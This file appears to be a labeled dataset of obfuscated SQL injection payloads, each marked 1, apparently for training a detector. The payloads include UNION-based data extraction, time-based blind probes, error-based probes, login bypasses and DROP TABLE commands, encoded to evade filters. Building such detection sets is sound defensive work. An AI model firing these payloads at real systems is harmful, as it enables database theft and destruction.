"1%29%29%25u0020UNION%25u0020SELECT%25u00201%2Cdatabase%28%29%2C3 -- random_noise--", 1
"%27%20or%201L%49KE1%2%30%2d-%20", 1
"; SELECT p%67_%73l%65ep(5); --", 1
";DROP/*%0d%0a*/TABLE", 1
"users;%0a--", 1
"aDMIn%27%20oR%20%271%27In%20%281%29%271", 1
"%27%09%09%09%09AND%09%09%09%09extractvalue(1,concat(0x5c,version()))%20OR%20(1)--", 1
"%27AND1%3D1--%250a", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#76ms3", 1
"%27%20AND%201%3C%3D1%20--%20", 1
"test%27%20O/*!*/R%20%271%27%3D%271%27%20%2F%2A	OR	(1)", 1
"1aND%0A1=1%0D%0a/**/--/**/RANDom_NOIsE", 1
"'/**/XOR/**/1LIKE1/**/--/**/#5ily9azae", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20--#dl62u4k4e", 1
"%u0027ANDextractvalue(1,concat(0x5c,version()))--%0a", 1
"1%27ORIF%28substring%28database%28%29%2C%2F%2A%250d%250a%2A%2F1%2C%250a1%29%3D%27a%27%2CSLEEP%285%29%2C0%29%0A--", 1
"waITF%254fr%2F%2A%2A%2FDe%256caY%20%27%2530%3A0%3A5%27--", 1
"%27/**/AND/**/1%3Dconvert(int,@@version)--", 1
"1'     UNION     SELECT     table_name,     null,     null     FROM     information_schema.tables     --", 1
"%27%09%09UNION%09%09SELECT%09%09null%2C%09%09null%2C%09%09null%09%09--%09%09", 1
"1'/*!*/       UNION        SELECT        table_name,        null,        null        FROM        information_schema.tables         || (1)--", 1
"%U0027%u0020oR%U0020eXISts(SELECt%U00201%u0020fRom%u0020usERS)--", 1
"%27%20UNION%20SELECT%201,2,3 OR 'b'='b'----vvfmlb9i9do5vn9", 1
"WA%49TFORDELAY'0:0:5'%2d%2d#%0d%0amore_noise%0d%0a", 1
"%27%20%20%20OR%20%20%20%31%3d1%20%20%20--%20%20%20", 1
"1) UNION SELECT 1,database(),3--#ym4qkycs6o", 1
"1%27%20Or%20i%46%28%73UBSTr%69n%47%28d%61tabase%%328%29%2C%201%2%43%201%2%39%3D%27a%27%2C%20SlEeP%285%29%2C%20%30%29%20--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020 OR 'b'='b'--", 1
"test'/**/XOR/**/'1'IN (1)'1'/**//*", 1
"1'/*!*/OR%20%20IF(substring(database(),%20%201,%20%201)%20=%20'a',%20%20SLEEP(5),%20%200)%20%20--", 1
"ADMiN%U0027%u0020o/**/r%U0020%U00271%u0027=%U00271", 1
"1' %4fR AsCIi(suB%73T%72iNG(DATaBAS%65(), 1, 1)) > %31%300  oR 'B'='b%27--", 1
"1%27%2F%2A%2A%2FOr%2F%2A%2A%2FASCii%28SUbstRing%28dATAbAsE%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F--", 1
"%25u0027%2F%2A%21%2A%2FUNION%25%25750020SELECT%25u002%25301%2C2%2C%2533-%252d", 1
"1)UNIONSELECT/*%0d%0a*/1,database(),3", 1
"OR(1)--", 1
"%2531%27%20AND%20su%2562string%28database%2528%29%2C%201%2C%201%29%2520LIKE%20%27s%27%20%252d-", 1
"1%u0027/**/A/*!12345*/ND/**/substring(database(),/**/1,/**/1)/**/=/**/%u0027s%u0027/**/--", 1
"1%29%29%20Union%20seLeCT%201%2cdATabasE%28%29%2c3--", 1
"1)%20%20%20%20UNIOn%20%20%20%20SELecT%20%20%20%201,DAtABASe(),3%20%20%20%20xoR%20%20%20%20'B'%20=	'b'--", 1
"'/**/AND/**/extractvalue(1,concat(0x5c,version()))/**//*!*/AND/**/1=1--", 1
"%u0027%u0020UNION%u%30020SELECT%u00%320%31,2,3%2d-", 1
"%27%20%55NION%20SELE%43T%20null,%20null,%20null%20%20%41ND%20%27a%27%3D%27%61%27--%20--u23bhv", 1
"test'/*!*/OR%20'1'< =  '1'%20--%20#vcp1yrg4q", 1
"adm%69n' OR %271'='1", 1
"1))UN/*!%2a/ION", 1
"SE%4cEC%54%0d%%30a1,database(%29,3--/*%0d%0a*/", 1
"1%2527%2520oR%2520if%28sUbsTRing%28dAtAbAse%28%29%2C%25201%2C%25201%29%253d%2527A%2527%2C%2520sleep%285%29%2C%25200%29%2520--", 1
"'/**/OR/**/1IN/**/(1)1/**//**/AND/**/'a'='a'--/**/", 1
"'UNIONSELECT%0d%0a1,2,3--", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)--#sxix34fflq", 1
"%27%20Or%20%271%27%3D%2527%2531", 1
"test' |%7c (1<=1)'%31'%3d'1%27 /*#563z9nx", 1
"1'  OR  IF(substring(database(),  1,  1)<%09=  'a',  SLEEP(5),  0)  --", 1
";%2f**/DROP T%41BLE users; %2d-", 1
"test' OR '1'='1' /*#wen5z4zduwcq7fo", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3%20OR%20%281%29--", 1
"1%27/**/or/**/ascii(sUBStriNG(dATABaSe(),/**/1,/**/1))/**/%3E/**/100/**//**//*!*/and/**/1%3D1--", 1
"1'%20%20%20%20%20uN/*!*/iOn%20%20%20%20%20sELEct%20%20%20%20%20TABLe_Name,%20%20%20%20%20nUlL,%20%20%20%20%20null%20%20%20%20%20From%20%20%20%20%20inFORmatioN_SCHEma.TABlES%20%20%20%20%20--", 1
"WAITFor delAY '0:0:5'--", 1
"' || '1'='1 /*!*/AND 1=1--5srscjg", 1
";DROP%0aTABLE", 1
"users;--%0d%0a", 1
"1'			OR			ascii(substring(database(),			1,			1))			>			100			--", 1
";dROpTAbleUSers;", 1
"/*!*/AND%0a1=1--", 1
"", 1
"1'/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**//*!12345*/OR%09%09'b' =%09'b'--", 1
"'OREXISTS(SELECT", 1
"1%0d%0aFROM/*%0a*/users)--", 1
"' OR exISTs(sElect 1 FrOM USErS)--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)/**//*!*/AND/**/1=1--", 1
"; SELECT pg_sleep(5); ----y9hq7wo78e", 1
"'AND/*%0a*/extractvalue(1,concat(0x5c,version()))--%0d%0a", 1
"1%27%20OR%20If(SUBStrING(DaTabAsE(),%201,%201)%3d%27a%27,%20SLeep(5),%200)%20--", 1
"%3b%20SELECTpg_sle%65p%285);/*%0d%0a*/-%2d--81m536dxcn0kp9z", 1
"test'/*!*/OR '1'IN (1)'1' --", 1
"'an%44%0d%0a1=1%20--/*%0d%0a*//*%0d%0a*/", 1
"1%27ORIF%28substring%28database%28%29%2C%0A1%2C1%29%3D%27a%27%2CSLEEP%285%29%2C0%29--", 1
"1'ANDsubstring(database(),1,1)%0a%20IN (1)%20's'/*%0a*/--%0a", 1
"1%27%20OR%20asc%69i(substri%6eg(%64a%74ab%61se(),%201,%201))%20%3E%20100%20/*!12345*/OR 'b'='b'--", 1
"1%u0020aND%U00201=1", 1
"1AND%2F%2A%250a%2A%2F1%3D1%2F%2A%250d%250a%2A%2F AND 'a'='a'", 1
"' or eXIsts(sELeCT 1 FROm uSeRS)--", 1
"1'OR%0aascii(substring(database(),1,1))%0a>100--/*%0a*/", 1
"admin'/**/OR/**/'1'='1 OR 'b'='b'", 1
"1'ANDsubstring(database(),1,1)%09>=	/*%0d%0a*/'s'%0d%0a#more_noise--", 1
"test'	XOR	'1'%09=%09'1'	--", 1
"'OR", 1
"1=1--", 1
"1))/**/UNION SELECT 1,database(),3----1zchiwebmwvs1jc", 1
"1'     AND     substring(database(),     1,     1)     IN     (1)     's'     --", 1
"test%27%20%20%20%20OR%20%20%20%20%271%27%20%20%3D%20%271%27%20%20%20%20/*", 1
"1'UNIONSELECT%0d%0atable_name,%0d%0anull,null/*%0a*/FROMinformation_schema.tables----7yvv7", 1
";DROP", 1
"TABLEusers;%0%64%0a/*!*/A%4e%44%0d%%30a1=1--", 1
"1'/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**//**/OR/**/'b'>='b'--#zhiw067", 1
"WA%49TFOR D%45LAY %270:0:5' AND 'a'='a'--%2d-hvdei8lam", 1
"1%27%20aNd%20suBsTrING(DAtABAse(),%201,%201)%20%3D%20%27S%27%20--", 1
"'          OR          EXISTS(SELECT          1          FROM          users)--#bjmd1q", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20/**/OR/**/'b'='b'--", 1
"%27%20UniOn%20Select%201,2,3 /*!*/AnD 1=1--", 1
"1%27%20%20%20%20UNION%20%20%20%20SELECT%20%20%20%20table_name,%20%20%20%20null,%20%20%20%20null%20%20%20%20FROM%20%20%20%20information_schema.tables%20%20%20%20--", 1
"1%27%2F%2A%2A%2FUN/*!*/ION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F--", 1
"1'        UNION        SELECT        table_name,        null,        null        FROM        information_schema.tables         AND 'a'='a'----uhbj8xjg", 1
"1' A%4eD %73ubstr%69ng(databa%73e(),%201%2c 1) = 's'  # more_noise----64m8zephszlzgls", 1
"'OR/*%0d%0a*/'1'LIKE'1", 1
"", 1
"1%25u002%2537%2F%2A%2A%2FUN%2549ON%25u0020SELECT%25u0020t%2561ble_name%2C%25u%2530020null%2C%25%25750020null%25u0020FROM%25u0020i%256ef%256frmation_sche%256da%252etables%25%25750%253020--", 1
"1AND%0d%0a1=1%0aOR%u0027b%u0027=%u0027b%u0027/*%0a*/", 1
"admin'OR%0a'1'='1--qqzr0o3tu", 1
"admin'||", 1
"/*%0a*/'1'", 1
"=%20'1", 1
"1%27/**/anD/**/SUbstRING(datAbAse(),/**/1,/**/1)/**/%3D/**/%27s%27/**/--#56inF", 1
"1%29%29%2520UNION%2520SELECT%25201%2Cdatabase%28%29%2C3--%23gp1ba3", 1
"1 AND 1<=%31 OR (1)", 1
"test%27%20OR%20%271%27%3D%271%27%20/*%20/*!*/AND%201%3D1", 1
"1%u0027/*!12345*//**//**//**//**//**/AND/**//**//**//**//**//**/substring(database(),/**//**//**//**//**//**/1,/**//**//**//**//**//**/1)/**//**//**//**//**//**/%09=%09/**//**//**//**//**//**/%u0027s%u0027/**//**//**//**//**//**/--", 1
";SELECTpg_sleep(5);/*%0d%0a*/--", 1
"", 1
"1%27ANDsubstring%28database%28%29%2C1%2C%2F%2A%250d%250a%2A%2F1%29%250aLIKE%27s%27--", 1
"tEsT%27%20||%20(1%3D1)%271%27%3D%271%27%20--%20", 1
"tes%74%u0027%u0020%u0020%4fR%u0020%u0020%u00271%u0027%%309=%u0020%u0020%u00271%u0027%u0020%u0020%u0020%20#%u0020%u0020more_noise-%2d%u0020%u0020", 1
"%u0027OREXISTS(SELECT1%0d%0aFROMusers)--", 1
"", 1
"'/**/||/**/'1'='1#c754e07wothf", 1
"TeST%27%20oR%20%271%27%3D%271%27%20--%20--3ug1v8os0j", 1
"Test'/*!*/or '1'='1' /*", 1
"%u0027/**/UNION/**/SELECT/**/null,/**/null,/**/null/**//**/OR/**/(1)--/**/", 1
"te%73t'O/*!*/R%20'1'='%31'--%0A", 1
"", 1
"1%20AND%%3201%3D1/*!*/# mo%72e_%6eoise", 1
"1'O/*!12345*/Rascii(substring(database(),/*%0a*/1,1))>100--#di2cczu7s", 1
"'/**/U%4eI%4fN        SE%4cECT        null,        nul%6c,        null        --", 1
"test%27%20OR%20%271%27%3D%271%27%20/*%20OR%20%27b%27%3D%27b%27", 1
"%27%20OR%201%3D1%20--%20%23ip43z7f4hj", 1
"%%327%20O%52%20%271%%327%3D%2%371/*!12345*/AND 'a'='a'", 1
"%27  Or%20'1'	IN (1) '1", 1
";%20SELECT%20pg_sleep(5);%20/**/AND/**/'a'='a'--", 1
"%u0027%u0020AND%u00201%3C%3D1%20%2d-%u0020", 1
"1' AND substring(database(), 1, 1) = 's' --#aqfyozo0qm1", 1
"1%u0020A/**/ND%u00201%3D1", 1
"test%27OR%0d%0a%271%27%3D%271%27/*", 1
"%27%20AN%64%201%3DCONVEr%74(INt,%40@vErsiO%4e)--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A # more_noise", 1
"'/*!*/&& 1=1 -- #kvf8jbbhp6g", 1
"test%27OR/*%0a*/%271%27%3D%271%27/*%0a*//*/*%0a*/--7k98ztecq9im1od", 1
"TesT'OR'1'In(1)'1'/*%0A*/--%0A", 1
"1'/**/or/**/If(sUBstrinG(DATABAse(),/**/1,/**/1)='A',/**/SlEep(5),/**/0)/**/----s3k1m", 1
"teST' or '1'='1' --", 1
"' and 1<=coNVeRT(INT,@@VeRsIOn) OR (1)--", 1
"'/**//**//**//**//**//**//**//**/OR/**//**//**//**//**//**//**//**/EXISTS(SELECT/**//**//**//**//**//**//**//**/1/**//**//**//**//**//**//**//**/FROM/**//**//**//**//**//**//**//**/users)/**//**//**//**//**//**//**//**//*!*/AND/**//**//**//**//**//**//**//**/1/**//**/=%091--", 1
"adMiN'/**/||/**/(1	= 1)'1'	= '1", 1
"' uNiON seLEcT nuLL, nUll, nuLl --", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20 -- random_noise--#bioovk", 1
"' || (1=1)EXISTS(SELECT 1 FROM users)----zoxmhf5bc", 1
"%27%20OR%20%271%27%3D%271#2fvdx8ed2swipjh", 1
";/*!*/   DROP    TABLE    users;    --", 1
"%27%20%7C%7C%20%271%27%3D%271#5xwn6eh3tvm", 1
"'/**/Or/**/'1'='1", 1
"test' OR '1'='1%27 /%2a", 1
"1))/**/UNION/**/SELECT/**/1,database(),3%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--", 1
"1'/**/U%4eIO%4e/*%2a%2fSELEC%54/**/tabl%65_name%2c/**/null,/**/null/**/FROM/**/information_schema.t%61%62les/**/--#3zbpwnu%32b%79kj", 1
"'/**/ANDext%72a%63t%76alue(1,co%6ecat(%30x5c,version()))--", 1
"", 1
"WAITFORDELAY/*%0d%0a*/'0:0:5'/**/OR/**/'b'='b'--/*%0d%0a*/", 1
"%u0027%u0020||%U0020%U00271%u0027=%U00271", 1
"1)uNion/*%0d%0a*/SElecT/*%0a*/1,DaTaBase(),3----52jOdojCqKx%0d%0a", 1
"1' XOR ascii(substring(database(), 1, 1)) > 100  OR 'b'='b'----ru38vmy3v", 1
";%20SELECT%20pg_sleep(5);%20/*!*/-- random_noise--#1b4rwc5j", 1
"1%u0027%u0020xoR%u0020AsciI(sUBSTRiNG(dATaBAsE(),%u00201,%u00201))%u0020>%u0020100%u0020--#k0i9F99bn", 1
"1' oR asCiI(sU%42stRIng(DatA%62AsE%28%29, 1, 1))%20> 100 --", 1
"1'/**/Or/**/ASCII(SUBSTRing(DATabASe(),/**/1,/**/1))/**/>/**/100/**/----nWT3cP5", 1
";/**/S%45LEC%54%20pg_sleep(5);%20--", 1
"1%27%2F%2A%2A%2FU%254eION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ft%2561bl%2565_na%256de%2C%2F%2A%2A%2Fnull%2C%2520null%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_sch%2565ma%252et%2561bles%2F%2A%2A%2F--", 1
"1'        OR        IF(SUBSTrinG(dataBasE(),        1,        1)	= 'A',        SLEeP(5),        0)        --", 1
"1%27%2%30oR%20aS%63II%28SuBSTRiNG(dATABAS%65(%29,%201,%201))%20%3E%2%30100%20--", 1
"1'/*!*/uNiOn    seLect    tABLE_name,    NulL,    NuLl    FRom    iNfoRmAtIon_sCHemA.TaBLeS    ----pmezngm", 1
"1))			UNION			SELECT			1,database(),3--", 1
"'/**/oR ExIsT%53%28SeleCt %31 FroM %75sERs)--", 1
"'/**/AN%44/**%2fe%78t%72ac%74value(1,concat(0x5c,versio%6e()))--", 1
"test'%20%20OR%20%20'1' = '1'%20%20--%20%20", 1
"%27%20AND%2%30extractvalu%65%281%2Cc%6fnca%74%280x5c%2Cversion%2%38%%329%29%29 # more_%6eoise--%23j%68p5k2", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--#aszyf5d0", 1
"' A%4ed 1  =%20coNVEr%54(inT,@@VERS%49oN)--", 1
"%27%2520A/**/ND%25201%2520%3D%20%201%2520--%2520", 1
"1%27%20oR%20ASciI(suBstRing(DaTABASe(),%201,%201))%20%3e%20100%20----p8ujz5e25qhdoal", 1
"%u0027/*!*/OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)--", 1
";SELECT/*%0d%0a*/pg_sleep(5);%0a--%0d%0a", 1
"'/%2a!%2a/AND1=1%0a--%0a#%61%33tnrcrn7n6xx9/*%0a*/", 1
";%20DROP%20TABLE%20users;%20--#7x0rvy", 1
"1) unioN SelecT 1,DATaBASE(),3--", 1
"test'/*!*/OR'1'<='1'/*%0d%0a*//*", 1
"", 1
"test'  OR  '1' =%09'1'  --  --wgtpdatc6", 1
"%2527%2520Or%2520%25271%2527%253d%25271", 1
"'OR", 1
"'1'%09=%09'1", 1
"%3B%20SeLEct%20Pg_slEeP%285%29%3b%20--", 1
"1)) UNION SELECT 1,database(),3 AND 'a'='a'----fe78fcf", 1
"admin'%20OR%20'1'	IN (1) '1%20/*!*/AND%201	= 1", 1
"'    Or    '1'%09=  '1", 1
"1))UNION%0d%0aSELECT/*%0d%0a*/1,database(),3----2wmg7erw04pkfe%0d%0a", 1
"'oR1=1", 1
"--#tee6iq", 1
"%27AND1%3D1%250a--random_noise--", 1
"1'oRif(subSTrinG(dAtABAsE(),1,", 1
"1)LIKE'a',SLeEP(5),/*%0a*/0)--", 1
"'and/*%0d%0a*/eXtracTvaLue(1,CoNcat(0X5c,versIOn()))--/*%0a*/", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/--#i39uqly7", 1
"1%29%20uNIOn%20SeLecT%201%2CdaTAbaSe%28%29%2C3--", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--random_noise--%0a", 1
"1))/**/UNION SELECT 1,database(),3--#1uwlqvyuw", 1
"%u0027/**/O/*!*/R/**/1=1/**/--/**/", 1
"test'/*!*/|| (1IN (1)1)'1'='1' /* # more_noise", 1
"1'/*!*/OR ascii(substring(database(), 1, 1)) > 100 ----gqwno61gs66a", 1
"'%20OR%201=1 --", 1
"adm%69n%%75002%37%u%30020OR%%750020%u00271%u0027=%u00271", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)	=%20%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"%74EST'			XOR			%271'%20=%20%271'			--", 1
"1%u0027/**/OR/**/IF(substring(database(),/**/1,/**/1)=%u0027a%u0027,/**/SLEEP(5),/**/0)/**/--#9kz1s9ajqcnbesa", 1
"'%20Uni%6fn S%65lECT 1,2,3--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#0z4ca4hd6", 1
"1)) unION SElEct 1,dATaBaSe(),3--", 1
"AdmiN'%20or%20'1'%20=/**//**/'1", 1
"admin%27%20OR%20%271%27%3D%271%20OR%20%27b%27%3D%27b%27", 1
"admin'OR%0a'1'='1/*%0d%0a*/--xg7cpi", 1
"1))UNIONSELECT/*%0d%0a*/1,database(),3--", 1
"", 1
"'UNION/*%0a*/SELECT1,2,3#more_noise----spzorb2wlh", 1
"WAITfor DElAy '0:0:5'--#QN73yMHhHtM3T", 1
"1'/**/uNIonSElEctTablE_nAmE,nUll,NULl%0afrom", 1
"infOrmAtIoN_sCHEMA.TablES--", 1
"'/*!*/AND extractvalue(1%2cconcat(0x5c,v%65%72sion(%29))%2d- && (1=1)'a'='a'", 1
"' UNION SEL%45C%54 null, null%2c null -%2d", 1
"%2574est%2527%252%2530OR%2520%25271%2527%253D%2527%2531%2527%2520%2F%2A", 1
"1%27%09%09%09%09OR%09%09%09%09AsCIi%28sUBsTRIng%28dAtabAsE%28%29%2c%09%09%09%091%2c%09%09%09%091%29%29%09%09%09%09%3E%09%09%09%09100%09%09%09%09--", 1
"test'/**/OR '1'='1' /* AND 'a'='a'", 1
"' AND 1=cOnverT(iNt,@@vERSIoN)--", 1
"%27/**/UN/*!12345*/ION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"'					AND					EXTractvAlU%65(1%2ccoNCat(0X5c%2C%76E%72siON()))--", 1
"1%25u0027%25u0020ANd%25u0020sUbsTrING%28datABaSE%28%29%2C%25u00201%2C%25u00201%29%25U0020LIKE%25u0020%25u0027S%25U0027%25u0020--", 1
"%u0027%U0020An%44%u0020%31=1%u002%30--%u00%320", 1
"1' OR %61scii(SUB%73TrIng(daTaBasE(),%201, 1))%20> 100 --#%6e9yhf%6aDZmaq6%71", 1
"%u0027OR%0d%0a1=1%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--/*%0a*/#8jpjgropbg4w", 1
"%27UNIONSELECTnull%2Cnull%2C%2F%2A%250a%2A%2Fnull%250a--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20 AND 'a'='a'--", 1
"1'%09%09%09UNION%09%09%09SELECT%09%09%09table_name,%09%09%09null,%09%09%09null%09%09%09FROM%09%09%09information_schema.tables%09%09%09 -- random_noise--", 1
"1'ANDsubstring(database(),", 1
"1,1)LIKE%0a's'", 1
"--", 1
"; DROP TABLE users; --#d5u6hi2", 1
"%u0027%u0020AND%u00201=convert(int,@@version)%u0020O/**/R%u0020(1)--", 1
"%u0027%u0020anD%u0020eXTrACtVa%6CuE(%31,CONCat(%30X5%63,VERsIon()%29)--", 1
"%27%%320or%201%3D1%20--%2%30", 1
"; SeLECT pG_SleEP(5); --", 1
"%27/**/AND%20e%78tractval%75e(1,conca%74(0x5c,%76e%72sio%6e()))%20--%20rando%6d_noise--", 1
"'%20AND e%78tractvalue(1,c%6fncat(0x5c,%76ersio%6e()))--", 1
"ADmiN' or '1'IN (1)'1", 1
"1%u0027/*!*/unioN%u0020selEct%u0020TAbLE_naMe,%u0020nULl,%u0020NuLl%u0020FRom%u0020informATion_SCHeMa.taBLes%u0020--", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20 AND 'a'='a'--%20#bhhmqsh3", 1
"%27/**/OR/**/%271%27%3D%271 OR (1)--9xsv1mvx8uy", 1
"' OR %271'='%31", 1
"' AND e%78tra%63tvalue(1,concat(0x5c,versi%6fn(%29)%29--", 1
"1) UNION SELECT 1,database(),3 -- random_noise--", 1
"1)UN/**/ION%0d%0aSELECT/*%0a*/1,database(),3--%0a--2t1t554", 1
"test%27O/*!*/R", 1
"%271%27%3D%271%27%0d%0a/*%0d%0a AND 'a'='a'", 1
"%u0027XOR1>=1/*%0d%0a*/--%0a/*%0d%0a*/", 1
"%27%20Union%20sElect%20nULL,%20NUll,%20nUlL%20--%20", 1
";SELECT%0d%0a/*%0a*/pg_sleep(5);--", 1
"1%u0027%u002%30UN%49%4fN%u0020SELECT%%75%30020table%5fn%61me%2c%%750020null%2c%u0020null%u0020FR%4fM%u0020information_schema.tables%u0020%20/*!*/AND%201%3D1--", 1
"1%u0027%u0020O%52%u0020asci%69(su%62string(data%62ase(),%u0020%31,%u00201))%u0020>%u0020100%u0020--", 1
"%3B%2520Selec%74%2520P%47_Sleep%285%2%39%3B%25%320--", 1
"' UNION S%45LEC%54 1,2%2c3 /*!*/A%4eD 1<=%31----krr3z", 1
"1) UNION SELECT%201%2cda%74a%62ase(),3--", 1
"' OR 1>=1 -- --40vcss8tf1em8ie", 1
"%27UNIONSELECTnull,null,null/*%0d%0a*/--%0a", 1
"%27%%320UnIoN%20sEl%45%43t%20nulL,%20null,%20%6E%75ll%20--%20", 1
"%2527%2520AND%25201%253C%253D1%2520--%2520--8z5zvhs83ioo", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--#fdeqr", 1
"1)%u0020%55NI%4f%4e%u0020SELECT%u0020%31,da%74abase(),3----25u4uvga7won52", 1
"1%29%2F%2A%21%2A%2FUNION%20SELECT%201%2Cdatabase%28%29%2C3----3jbjz2", 1
"1'/*!*/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/--", 1
"%27					O/*!12345*/R					%271%27%20%3D	%271", 1
"%3B%2F%2A%2A%2%46DROP%20%54ABL%45%%320u%73ers%3B%%320%20--%20random_noise--", 1
"admin' OR '1'='1--fq4ervme1iam", 1
";%09%09%09%09%09SELECT%09%09%09%09%09pg_sleep(5);%09%09%09%09%09--", 1
"'OR/*%0a*/EXISTS(SELECT1FROMusers) # more_noise--/*%0a*/", 1
";DROPTABLEusers; AND 'a'='a'--", 1
"", 1
"%27%20AND%201%3D1%20--%20--qp89wpbf72u", 1
"1'				OR				IF(substring(database(),				1,				1)%20=/**/ 'a',				SLEEP(5),				0)				--", 1
"1'      OR%20%49F(substring(da%74abase(%29,%201,      1)  =%20'a',      SLEEP(5),      0)      %2d-", 1
"%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"' aNd eXtraCtvaLue(1,COncAT(0x5C,VERSIon()))--#iqmw812k7", 1
"1/**/AND/**/1=1%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--g3af33", 1
"TES%74%2%37%20oR%20%271%%327%3d%271%27%20--%2%30", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)<='a',/**/SLEEP(5),/**/0)/**/--", 1
"t%65st'%2f*%2a/OR/**/'1' =	'1'/**/--/*%2a/", 1
"; SElE%63T %50G_%73LEeP(5); --", 1
";/*!12345*/DROP%u0020TABLE%u0020users;%u0020--#j9mu1cc", 1
"%27 OR 1=%31  %4fR 'b'='b'-- #ciizz684c%61", 1
"waItfor%20%20DElay%20%20%270:0:5%27--", 1
"%3B%09%09%09%09%09seLect%09%09%09%09%09pg_SlEEp%285%29%3B%09%09%09%09%09--", 1
"%u0027%u0020OR%u0020%u00271%u0027  = %u00271", 1
"1'        AND        substring(database(),        1,        1)         =          's'        --", 1
";%U0020DRoP%u0020TABLE%U0020UseRS;%u0020--", 1
"1/*!*/AND%201%3D1", 1
"adm%69n%27/**/OR%20%271%27%3D%271", 1
"1)) UNION SELECT 1,database(),3----qo0gw4j", 1
"%27OR1%3d1%0d%0A--/*%0A*/", 1
"'UNIONSELECT%0a1,2,3--", 1
"admin%27%2F%2A%21%2A%2FOR%20%271%27%3D%271#zjwm2hczp0owu", 1
"1' And SubStrINg(dATABasE(), 1, 1) = 'S' --", 1
"%27%20aND%20eXtraCtvAlUe(1,ConCAT(0x5C,VeRSiOn()))--", 1
"%27%20AND%20%65xtractv%61lue%281%2cconc%61t(0x5c,version()))----ex9v7tpwg6soif", 1
"1'/*!12345*/OR			ascii(substring(database(),			1,			1))			>			100						AND			'a' =%20'a'--#1sh8177acx9vvy", 1
"1'UNION/*%0a*/SELECTtable_name,null,%0anullFROM%0ainformation_schema.tables/*!12345*/# more_noise--", 1
"test'/**/OR/**/'1'='1'/**//**//*!*/AND/**/1=1--/**/--c2aimg2dd16", 1
"admin%%327%20%4f/*!*/R%20%271%27%%33D%271", 1
"%27					OR					%271%27%20%3D%20%271", 1
"TESt'or%0d%0a'1'<='1'%0d%0a/*--yr0dwmyrp%0d%0a", 1
"%27UNION%0d%0a%53ELECT/*%0a*/1,%32,3--%0a", 1
